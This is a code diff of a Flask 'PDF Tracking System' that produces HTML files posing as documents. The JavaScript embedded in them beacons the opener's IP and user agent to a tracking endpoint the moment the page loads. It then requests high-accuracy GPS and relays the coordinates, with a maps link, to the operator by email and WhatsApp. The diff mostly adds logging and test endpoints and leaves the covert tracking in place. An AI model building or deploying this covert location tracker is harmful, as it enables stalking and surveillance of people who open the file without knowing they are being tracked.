@@ -74,7 +74,7 @@ class PDFTracker:
             message['To'] = email_to
             message['Subject'] = f"📍 DOCUMENT OPENED: {pdf_id} - {client_name}"
             
-            # Always show location information, even if basic
+            # Build location information
             if location_data['gps_source'] == 'browser_gps':
                 accuracy_meters = min(location_data['accuracy'], 1000)
                 if accuracy_meters < 50:
@@ -88,7 +88,7 @@ class PDFTracker:
                 accuracy_info = "🌐 Basic Location Tracking"
                 location_source = "IP Geolocation"
             
-            # Always include GPS information if coordinates exist
+            # Build GPS information
             gps_section = ""
             if location_data['latitude'] and location_data['longitude']:
                 lat = location_data['latitude']
@@ -110,12 +110,11 @@ class PDFTracker:
 
 """
             else:
-                # Even without coordinates, provide basic info
                 gps_section = f"""
 📍 BASIC LOCATION TRACKING:
    📏 {accuracy_info}
    🔧 {location_source}
-   ℹ️  Precise coordinates unavailable, but location was tracked.
+   ℹ️  Document opened and tracked successfully.
 """
             
             body = f"""🔔 DOCUMENT TRACKING NOTIFICATION
@@ -153,17 +152,20 @@ class PDFTracker:
             return f"error: {str(e)}"
     
     def send_whatsapp_notification(self, pdf_id, client_name, access_data, location_data):
-        """Send WhatsApp notification - ALWAYS sends location data"""
+        """Send WhatsApp notification with proper API integration"""
         try:
             instance_id = os.getenv('WHATSAPP_INSTANCE_ID', '')
             token = os.getenv('WHATSAPP_TOKEN', '')
             to_number = os.getenv('WHATSAPP_TO_NUMBER', '')
             
-            if not all([instance_id, token, to_number]):
-                logger.warning("WhatsApp configuration incomplete")
-                return "not_configured"
+            logger.info(f"🔧 WhatsApp Config - Instance: {instance_id}, To: {to_number}")
             
-            # Always build location information
+            if not all([instance_id, token, to_number]):
+                error_msg = "WhatsApp configuration incomplete - check environment variables"
+                logger.error(f"❌ {error_msg}")
+                return f"config_error: {error_msg}"
+            
+            # Build location information
             if location_data['gps_source'] == 'browser_gps':
                 accuracy_meters = min(location_data['accuracy'], 1000)
                 if accuracy_meters < 50:
@@ -177,14 +179,19 @@ class PDFTracker:
                 accuracy_info = "🌐 Basic Location"
                 location_source = "IP Tracking"
             
-            # Always include GPS section with coordinates if available
-            gps_section = ""
+            # Build message content
             if location_data['latitude'] and location_data['longitude']:
                 lat = location_data['latitude']
                 lng = location_data['longitude']
                 maps_link = f"https://maps.google.com/?q={lat},{lng}"
                 
-                gps_section = f"""
+                message = f"""📍 *DOCUMENT OPENED - LOCATION TRACKED*
+
+📄 *Document:* {pdf_id}
+👤 *Client:* {client_name}
+🕒 *Time:* {access_data['access_time']}
+🌐 *IP:* {access_data['ip_address']}
+
 📍 *Location Coordinates:*
    🎯 {lat:.6f}, {lng:.6f}
    📏 {accuracy_info}
@@ -193,30 +200,27 @@ class PDFTracker:
 🗺️ *View on Maps:*
    {maps_link}
 
-"""
+Tracking completed successfully! 🎯"""
             else:
-                # Even without precise coordinates, send basic tracking info
-                gps_section = f"""
-📍 *Location Tracking Active:*
-   📏 {accuracy_info}
-   🔧 {location_source}
-   ℹ️  Document opened and tracked successfully.
-"""
-            
-            message = f"""📍 *DOCUMENT OPENED - LOCATION TRACKED*
+                message = f"""📍 *DOCUMENT OPENED - LOCATION TRACKED*
 
 📄 *Document:* {pdf_id}
 👤 *Client:* {client_name}
 🕒 *Time:* {access_data['access_time']}
 🌐 *IP:* {access_data['ip_address']}
 
-{gps_section}
+📍 *Location Tracking Active:*
+   📏 {accuracy_info}
+   🔧 {location_source}
+   ℹ️ Document opened and tracked successfully.
+
 Tracking completed successfully! 🎯"""
             
+            # Prepare API request for UltraMSG
             url = f"https://api.ultramsg.com/{instance_id}/messages/chat"
             payload = {
                 "token": token,
-                "to": f"+{to_number}",
+                "to": f"{to_number}",  # Remove the + prefix
                 "body": message
             }
             
@@ -224,27 +228,46 @@ Tracking completed successfully! 🎯"""
                 'Content-Type': 'application/x-www-form-urlencoded'
             }
             
-            logger.info(f"💬 Sending WhatsApp to +{to_number}")
-            response = requests.post(url, data=payload, headers=headers, timeout=15)
+            logger.info(f"💬 Attempting to send WhatsApp to {to_number}")
+            logger.info(f"🌐 API URL: {url}")
+            
+            # Send request with detailed logging
+            response = requests.post(url, data=payload, headers=headers, timeout=30)
+            
+            logger.info(f"📡 WhatsApp API Response Status: {response.status_code}")
+            logger.info(f"📡 WhatsApp API Response: {response.text}")
             
             if response.status_code == 200:
                 result = response.json()
-                if result.get('sent') == 'true':
+                logger.info(f"📡 WhatsApp API Result: {result}")
+                
+                if result.get('sent') == 'true' or 'message' in result:
                     logger.info(f"✅ WhatsApp sent successfully for {pdf_id}")
                     return "sent"
                 else:
-                    logger.error(f"❌ WhatsApp API error: {result}")
-                    return f"api_error: {result}"
+                    error_msg = f"WhatsApp API returned unexpected response: {result}"
+                    logger.error(f"❌ {error_msg}")
+                    return f"api_error: {error_msg}"
             else:
-                logger.error(f"❌ WhatsApp HTTP error: {response.status_code}")
+                error_msg = f"WhatsApp HTTP error: {response.status_code} - {response.text}"
+                logger.error(f"❌ {error_msg}")
                 return f"http_error: {response.status_code}"
                 
+        except requests.exceptions.Timeout:
+            error_msg = "WhatsApp API request timed out"
+            logger.error(f"❌ {error_msg}")
+            return f"timeout_error: {error_msg}"
+        except requests.exceptions.ConnectionError:
+            error_msg = "WhatsApp API connection failed"
+            logger.error(f"❌ {error_msg}")
+            return f"connection_error: {error_msg}"
         except Exception as e:
-            logger.error(f"❌ WhatsApp sending failed: {str(e)}")
+            error_msg = f"WhatsApp sending failed: {str(e)}"
+            logger.error(f"❌ {error_msg}")
             return f"error: {str(e)}"
 
     def record_access_async(self, pdf_id, client_name, ip_address, user_agent, gps_data=None):
-        """Record access and send notifications - ALWAYS sends notifications"""
+        """Record access and send notifications"""
         def process_notifications():
             try:
                 logger.info(f"🎯 Processing notifications for {pdf_id}")
@@ -257,9 +280,8 @@ Tracking completed successfully! 🎯"""
                     'user_agent': user_agent
                 }
                 
-                # ALWAYS create location data, even if GPS is not available
+                # Create location data
                 if gps_data and gps_data.get('latitude') and gps_data.get('longitude'):
-                    # GPS data available
                     raw_accuracy = gps_data.get('accuracy', 1000)
                     capped_accuracy = min(raw_accuracy, 1000)
                     
@@ -273,20 +295,19 @@ Tracking completed successfully! 🎯"""
                         'gps_source': 'browser_gps',
                         'service': 'browser_geolocation'
                     }
-                    logger.info(f"🎯 Using real-time GPS coordinates for {pdf_id}")
+                    logger.info(f"🎯 Using GPS coordinates for {pdf_id}")
                 else:
-                    # GPS not available, but still track basic information
                     location_data = {
                         'country': 'Location Tracked',
                         'city': 'Basic Location',
                         'region': 'IP Based',
                         'latitude': None,
                         'longitude': None,
-                        'accuracy': 5000,  # Basic accuracy for IP
+                        'accuracy': 5000,
                         'gps_source': 'basic_tracking',
                         'service': 'ip_basic'
                     }
-                    logger.info(f"🌐 Using basic tracking for {pdf_id} - IP: {ip_address}")
+                    logger.info(f"🌐 Using basic tracking for {pdf_id}")
                 
                 # Save to database
                 cursor = self.conn.cursor()
@@ -300,13 +321,13 @@ Tracking completed successfully! 🎯"""
                     location_data['country'], location_data['city'], location_data['region'],
                     location_data['latitude'], location_data['longitude'], location_data['accuracy'],
                     location_data['gps_source'], user_agent,
-                    'processing', 'processing', 'opened'
+                    'pending', 'pending', 'opened'
                 ))
                 self.conn.commit()
                 
                 record_id = cursor.lastrowid
                 
-                # ALWAYS send notifications
+                # Send notifications
                 logger.info("📧 Sending email notification...")
                 email_status = self.send_email_notification(pdf_id, client_name, access_data, location_data)
                 
@@ -324,7 +345,6 @@ Tracking completed successfully! 🎯"""
                 logger.info(f"✅ Notifications completed for {pdf_id}")
                 logger.info(f"   📧 Email: {email_status}")
                 logger.info(f"   💬 WhatsApp: {whatsapp_status}")
-                logger.info(f"   📍 Tracking Type: {location_data['gps_source']}")
                 
             except Exception as e:
                 logger.error(f"❌ Error in notification processing: {str(e)}")
@@ -341,11 +361,15 @@ tracker = PDFTracker()
 
 @app.route('/')
 def home():
-    return render_template('index.html')
+    return """
+    <h1>PDF Tracking System</h1>
+    <p>System is running. Check the logs for tracking activity.</p>
+    <p>Create documents using the /create-document endpoint.</p>
+    """
 
 @app.route('/track-pdf/<pdf_id>/<client_name>', methods=['GET', 'POST'])
 def track_pdf_access(pdf_id, client_name):
-    """Endpoint to track PDF access - ALWAYS tracks and sends notifications"""
+    """Endpoint to track PDF access"""
     try:
         # Get client information
         if request.headers.get('X-Forwarded-For'):
@@ -362,23 +386,21 @@ def track_pdf_access(pdf_id, client_name):
                 gps_data = request.get_json()
                 if gps_data and 'latitude' in gps_data and 'longitude' in gps_data:
                     logger.info(f"🎯 Received GPS data for {pdf_id}")
-                    logger.info(f"📍 GPS Coordinates: {gps_data['latitude']:.6f}, {gps_data['longitude']:.6f}")
                 else:
-                    logger.info(f"📱 Basic tracking data received for {pdf_id}")
+                    logger.info(f"📱 Basic tracking data for {pdf_id}")
             except Exception as e:
                 logger.info(f"📄 Form data received for {pdf_id}")
         
         logger.info(f"📥 Tracking request: {pdf_id} - {client_name} from IP: {ip_address}")
         
-        # ALWAYS process tracking
+        # Process tracking
         tracker.record_access_async(pdf_id, client_name, ip_address, user_agent, gps_data)
         
-        # Return success response
+        # Return response
         if request.method == 'POST':
             response = jsonify({
                 'success': True, 
-                'message': 'Tracking data received successfully',
-                'tracking_type': 'gps' if gps_data else 'basic'
+                'message': 'Tracking data received successfully'
             })
             response.headers.add('Access-Control-Allow-Origin', '*')
             return response
@@ -397,7 +419,7 @@ def track_pdf_access(pdf_id, client_name):
 
 @app.route('/create-document', methods=['POST'])
 def create_document():
-    """Create a tracked HTML document with auto GPS and always-send functionality"""
+    """Create a tracked HTML document"""
     try:
         data = request.get_json()
         if not data:
@@ -410,7 +432,7 @@ def create_document():
         # Get base URL
         base_url = request.host_url.rstrip('/')
         
-        # Create HTML document with auto GPS and always-send
+        # Create HTML document
         tracking_url = f"{base_url}/track-pdf/{pdf_id}/{client_name}"
         
         html_content = """<!DOCTYPE html>
@@ -486,12 +508,10 @@ def create_document():
     <script>
         const trackingUrl = '""" + tracking_url + """';
         
-        // Function to cap accuracy
         function capAccuracy(accuracy) {
             return Math.min(accuracy, 1000);
         }
         
-        // Function to send tracking data (ALWAYS sends)
         function sendTrackingData(trackingData) {
             console.log("Sending tracking data:", trackingData);
             
@@ -513,19 +533,15 @@ def create_document():
             });
         }
         
-        // Auto GPS function - tries to get precise location
         function autoRequestGPS() {
             document.getElementById('statusText').textContent = '🔄 Requesting precise location...';
             
             if (!navigator.geolocation) {
-                // No geolocation support - send basic tracking
                 sendBasicTracking();
                 return;
             }
             
-            // Try to get precise location first
             navigator.geolocation.getCurrentPosition(
-                // Success - got precise GPS
                 function(position) {
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
@@ -544,12 +560,10 @@ def create_document():
                     
                     sendTrackingData(gpsData);
                 },
-                // Error - fallback to basic tracking
                 function(error) {
                     console.log("GPS not available, using basic tracking");
                     sendBasicTracking();
                 },
-                // GPS options
                 {
                     enableHighAccuracy: true,
                     timeout: 10000,
@@ -558,7 +572,6 @@ def create_document():
             );
         }
         
-        // Basic tracking function - ALWAYS works
         function sendBasicTracking() {
             const basicData = {
                 timestamp: new Date().toISOString(),
@@ -570,20 +583,16 @@ def create_document():
             sendTrackingData(basicData);
         }
         
-        // Initialize auto-tracking immediately
         function initializeAutoTracking() {
             console.log('Starting automatic tracking...');
             
-            // Send basic tracking immediately
             sendBasicTracking();
             
-            // Then try to get precise GPS
             setTimeout(() => {
                 autoRequestGPS();
             }, 1000);
         }
         
-        // Start tracking when page loads
         window.addEventListener('load', initializeAutoTracking);
         
     </script>
@@ -596,23 +605,84 @@ def create_document():
             'client_name': client_name,
             'html_content': html_content,
             'tracking_url': tracking_url,
-            'download_filename': f"{pdf_id}_{client_name}.html",
-            'features': [
-                'Auto GPS Request',
-                'Always Sends Location',
-                'No Precise Location Unavailable Messages',
-                'Works Even Without GPS Permission'
-            ]
+            'download_filename': f"{pdf_id}_{client_name}.html"
         })
         
     except Exception as e:
         logger.error(f"Error creating document: {str(e)}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
+@app.route('/test-whatsapp', methods=['GET'])
+def test_whatsapp():
+    """Test WhatsApp configuration"""
+    try:
+        test_data = {
+            'pdf_id': 'TEST_WHATSAPP',
+            'client_name': 'Test Client',
+            'access_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'ip_address': '8.8.8.8',
+            'user_agent': 'Test User Agent'
+        }
+        
+        location_data = {
+            'country': 'Test Country',
+            'city': 'Test City',
+            'region': 'Test Region',
+            'latitude': 40.712728,
+            'longitude': -74.006015,
+            'accuracy': 25,
+            'gps_source': 'browser_gps',
+            'service': 'test'
+        }
+        
+        result = tracker.send_whatsapp_notification(
+            test_data['pdf_id'], 
+            test_data['client_name'], 
+            test_data,
+            location_data
+        )
+        
+        return jsonify({
+            'success': 'sent' in result,
+            'status': result,
+            'message': 'WhatsApp test completed'
+        })
+        
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 500
+
+@app.route('/config-status', methods=['GET'])
+def config_status():
+    """Check configuration status"""
+    whatsapp_configured = bool(
+        os.getenv('WHATSAPP_INSTANCE_ID') and 
+        os.getenv('WHATSAPP_TOKEN') and 
+        os.getenv('WHATSAPP_TO_NUMBER')
+    )
+    
+    email_configured = bool(os.getenv('EMAIL_FROM') and os.getenv('EMAIL_PASSWORD'))
+    
+    return jsonify({
+        'whatsapp_configured': whatsapp_configured,
+        'email_configured': email_configured,
+        'whatsapp_instance_id': os.getenv('WHATSAPP_INSTANCE_ID', 'Not set'),
+        'whatsapp_to_number': os.getenv('WHATSAPP_TO_NUMBER', 'Not set'),
+        'email_from': os.getenv('EMAIL_FROM', 'Not set')
+    })
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     logger.info(f"🚀 Starting PDF Tracking System on port {port}")
-    logger.info("🎯 Features: Auto GPS + Always Sends Location")
-    logger.info("📍 No more 'Precise location unavailable' messages")
-    logger.info("📱 Always sends WhatsApp notifications with location data")
+    logger.info("🔧 Test endpoints:")
+    logger.info("  - /test-whatsapp - Test WhatsApp configuration")
+    logger.info("  - /config-status - Check environment variables")
+    logger.info("📝 Make sure these environment variables are set:")
+    logger.info("  - WHATSAPP_INSTANCE_ID")
+    logger.info("  - WHATSAPP_TOKEN") 
+    logger.info("  - WHATSAPP_TO_NUMBER")
+    logger.info("  - EMAIL_FROM")
+    logger.info("  - EMAIL_PASSWORD")
     app.run(host='0.0.0.0', port=port, debug=False)
